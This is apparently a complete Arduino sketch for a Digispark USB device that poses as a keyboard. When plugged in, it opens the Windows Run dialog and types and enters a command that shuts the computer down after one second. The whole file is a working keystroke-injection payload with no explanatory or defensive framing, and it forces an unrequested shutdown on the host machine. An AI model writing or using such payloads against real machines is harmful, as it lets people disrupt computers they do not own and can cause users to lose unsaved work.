#include "DigiKeyboard.h"

void setup() {
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    DigiKeyboard.delay(500); 
    DigiKeyboard.print("shutdown -s -t 1");        
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {}
